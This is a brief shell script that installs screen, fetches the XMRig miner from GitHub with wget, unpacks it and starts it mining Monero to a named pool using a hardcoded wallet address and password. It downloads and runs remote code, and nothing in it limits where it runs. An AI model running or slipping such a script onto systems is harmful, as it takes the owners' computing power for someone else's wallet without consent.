#monero.sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz 
ls
tar xf xmrig-6.10.0-linux-x64.tar.gz 
ls 
./xmrig-6.10.0/xmrig -o sg.monero.herominers.com:10191 -u 8AoaWf4y1ME9yAkym1mLaMMXFPAAnWs8C1a3eoZjWLV9R7JGLWro42Q97g9FvHhsAbXjPrC1Ye7WiTXb1hLtnV6B37tnEbc.7000 -p Oskaybaruss -a rx/0 -k 
